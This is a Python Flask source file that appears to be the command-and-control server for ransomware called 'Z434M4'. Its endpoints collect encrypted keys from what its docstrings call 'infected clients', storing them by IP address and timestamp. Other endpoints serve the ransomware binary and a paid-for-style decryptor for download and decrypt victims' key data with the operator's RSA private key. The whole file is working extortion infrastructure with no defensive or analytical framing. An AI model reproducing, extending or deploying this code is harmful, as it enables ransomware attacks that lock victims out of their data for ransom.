from flask import Flask, redirect, request, Response, send_file
from flask import render_template, url_for
import os
import time
import base64
import json
import logging
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# File paths
BINARIES_PATH = 'binaries/'
Z434M4_BINARY = os.path.join(BINARIES_PATH, 'Z434M4')
DECRYPTOR_BINARY = os.path.join(BINARIES_PATH, 'decryptor')
KEYS_STORAGE_PATH = 'received_keys/'
#server key path
KEY_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)))
PRIVATE_KEY_PATH = os.path.join(KEY_PATH, "private_key.key")
PUBLIC_KEY_PATH = os.path.join(KEY_PATH, "public_key.key")

# Ensure the keys storage directory exists
os.makedirs(KEYS_STORAGE_PATH, exist_ok=True)

# Response headers
HEADERS = {'Server': 'Z434M4 WebServer'}

# Load keys with proper error handling
try:
    with open(PRIVATE_KEY_PATH, "rb") as f:
        private_key_data = f.read()
        private_key = serialization.load_pem_private_key(
            private_key_data,
            password=None
        )
    
    with open(PUBLIC_KEY_PATH, "rb") as f:
        public_key_data = f.read()
        public_key = serialization.load_pem_public_key(public_key_data)
        
    logger.info("Successfully loaded encryption keys")
except Exception as e:
    logger.error(f"Failed to load keys: {str(e)}")
    raise

app = Flask("Z434M4-web-server")

@app.errorhandler(404)
def page_not_found(error):
    logger.warning(f"404 error: {request.path}")
    return Response("nothing to do here ...", status=404, headers=HEADERS)

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"500 error: {str(error)}")
    return Response("internal server error", status=500, headers=HEADERS)

@app.route("/receive-keys/", methods=['POST'])
def receive_keys():
    """Receive encrypted keys from infected clients"""
    try:
        if not request.data:
            return Response("No content", status=411, headers=HEADERS)
        
        # Store client keys with timestamp
        timestamp = int(time.time())
        client_ip = request.remote_addr
        filename = f"{KEYS_STORAGE_PATH}/{client_ip}_{timestamp}.json"
        
        with open(filename, 'wb') as f:
            f.write(request.data)
        
        logger.info(f"Received keys from {client_ip}")
        return Response("Keys received", status=200, headers=HEADERS)
    except Exception as e:
        logger.error(f"Error receiving keys: {str(e)}")
        return Response("Server error", status=500, headers=HEADERS)

@app.route("/download-Z434M4/", methods=["GET"])
def download_Z434M4():
    """Serve the Z434M4 binary to clients"""
    try:
        if os.path.exists(Z434M4_BINARY):
            logger.info(f"Serving Z434M4 binary to {request.remote_addr}")
            return send_file(Z434M4_BINARY, 
                             as_attachment=True, 
                             download_name="Z434M4")
        else:
            logger.warning(f"Z434M4 binary not found at {Z434M4_BINARY}")
            return Response("File not found", status=404, headers=HEADERS)
    except Exception as e:
        logger.error(f"Error serving Z434M4 binary: {str(e)}")
        return Response("Server error", status=500, headers=HEADERS)

@app.route("/download-decryptor/", methods=["GET"])
def download_decryptor():
    """Serve the decryptor binary to clients"""
    try:
        if os.path.exists(DECRYPTOR_BINARY):
            logger.info(f"Serving decryptor binary to {request.remote_addr}")
            return send_file(DECRYPTOR_BINARY, 
                             as_attachment=True, 
                             download_name="decryptor")
        else:
            logger.warning(f"Decryptor binary not found at {DECRYPTOR_BINARY}")
            return Response("File not found", status=404, headers=HEADERS)
    except Exception as e:
        logger.error(f"Error serving decryptor binary: {str(e)}")
        return Response("Server error", status=500, headers=HEADERS)

@app.route("/decrypt/", methods=['POST'])
def decrypt():
    """Decrypt client data using the server's private key"""
    data = request.data.decode('UTF-8')

    if not data:
        return Response("No content.", status=411, headers=HEADERS)

    try:
        # Decode the base64 data
        decoded_data = base64.b64decode(data)
        
        try:
            # Parse the JSON data
            enc_data = json.loads(decoded_data)
            
            # Decrypt the data
            decrypted_parts = []
            for encrypted_chunk in enc_data:
                chunk_bytes = base64.b64decode(encrypted_chunk)
                decrypted_chunk = private_key.decrypt(
                    chunk_bytes,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                decrypted_parts.append(decrypted_chunk.decode('utf-8'))
            
            decrypted = "".join(decrypted_parts)
            logger.info(f"Successfully decrypted data for {request.remote_addr}")
            return Response(decrypted, status=200, headers=HEADERS)
            
        except json.JSONDecodeError:
            logger.warning(f"JSON decode error from {request.remote_addr}")
            return Response('Error in the JSON format', status=400, headers=HEADERS)
        except Exception as e:
            logger.error(f"Decryption error: {str(e)}")
            return Response("Invalid encryption or key format", status=400, headers=HEADERS)
            
    except base64.binascii.Error:
        logger.warning(f"Base64 decode error from {request.remote_addr}")
        return Response('Wrong format. Expected: base64 encoded data', status=415, headers=HEADERS)

@app.route("/")
def main():
    return Response('nothing to do here...', status=200, headers=HEADERS)

@app.route("/test")
def test():
    return Response('test', status=200, headers=HEADERS)

if __name__ == '__main__':
    port = 8000
    host = '127.0.0.1'
    logger.info(f"Starting server at {host}:{port}")
    app.run(host=host, port=port, debug=False)